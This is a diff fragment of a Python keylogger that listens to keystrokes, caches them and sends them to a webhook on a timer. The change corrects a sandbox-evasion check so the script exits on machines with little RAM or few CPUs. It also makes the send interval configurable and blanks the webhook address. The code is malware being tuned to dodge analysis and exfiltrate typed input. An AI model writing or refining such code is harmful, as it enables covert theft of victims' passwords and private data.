@@ -5,7 +5,7 @@ cpu_count = cpu_count()
 ram_size = int(round(virtual_memory().total / (1024 ** 3)))
 
 if __name__ == "__main__":
-    if ram_size >= 2 and cpu_count >= 2:
+    if ram_size <= 2 or cpu_count < 2:
         exit()
 
     from threading import Timer
@@ -15,7 +15,8 @@ if __name__ == "__main__":
 
     cache = []
     timer = None
-    webhook_url = 'WEBHOOK_URL'
+    seconds = 60
+    webhook_url = ''
     space_count, enter_count, backspace_count = 1, 1, 1
 
     inputs = {
@@ -97,10 +98,10 @@ if __name__ == "__main__":
                 backspace_count = 1
         if timer and len(cache) <= 500:
             timer.cancel()
-            timer = Timer(1 * 60, send_cache)
+            timer = Timer(seconds, send_cache)
             timer.start()
         elif not timer:
-            timer = Timer(1 * 60, send_cache)
+            timer = Timer(seconds, send_cache)
             timer.start()
 
     keyboard_listener = keyboard.Listener(on_press=on_press)
